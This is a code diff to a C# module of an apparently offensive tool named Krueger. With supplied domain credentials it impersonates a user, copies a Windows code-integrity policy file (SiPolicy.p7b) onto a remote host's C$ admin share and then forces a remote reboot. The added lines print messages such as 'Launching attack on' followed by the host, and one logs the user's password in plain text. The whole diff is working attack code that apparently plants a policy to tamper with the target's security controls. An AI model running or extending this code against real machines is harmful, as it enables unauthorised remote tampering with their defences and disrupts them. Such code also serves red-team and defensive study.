@@ -6,6 +6,7 @@ using System.Security.Principal;
 using System.DirectoryServices;
 using System.DirectoryServices.ActiveDirectory;
 using System.IO;
+using System.Runtime.Remoting.Contexts;
 
 namespace Krueger.Modules
 {
@@ -107,8 +108,10 @@ namespace Krueger.Modules
                                     domain = d.Name;
                                 }
 
+                                Console.WriteLine("[+] Launching attack on " + host);
                                 AppDomain.CurrentDomain.SetPrincipalPolicy(PrincipalPolicy.WindowsPrincipal);
                                 IntPtr token = IntPtr.Zero;
+                                Console.WriteLine($"[+] Impersonating user with credentials: {domain}/{username}:{password}");
                                 Interop.LogonUser(username, domain, password, (int)LogonType.LOGON32_LOGON_BATCH, (int)LogonProvider.LOGON32_PROVIDER_DEFAULT, ref token);
                                 WindowsIdentity identity = new WindowsIdentity(token);
                                 WindowsImpersonationContext context = identity.Impersonate();
@@ -116,8 +119,12 @@ namespace Krueger.Modules
                                 string target = @"\\" + host + @"\C$\Windows\System32\CodeIntegrity\SiPolicy.p7b";
 
                                 File.Copy(policy, target, true);
+                              
                                 Console.WriteLine("[+] Moved policy successfully");
+                                Reboot.reboot(host);
                                 context.Undo();
+                                Console.WriteLine("[+] Rebooted target");
+
                             }
                             else
                             {
@@ -126,10 +133,12 @@ namespace Krueger.Modules
                         }
                         else
                         {
-                            Domain d = Domain.GetCurrentDomain();
+                            Console.WriteLine("[+] Launching attack on " + host);
                             string target = @"\\" + host + @"\C$\Windows\System32\CodeIntegrity\SiPolicy.p7b";
                             File.Copy(policy, target, true);
                             Console.WriteLine("[+] Moved policy successfully");
+                            Reboot.reboot(host);
+                            Console.WriteLine("[+] Rebooted target");
                         }
 
                     }
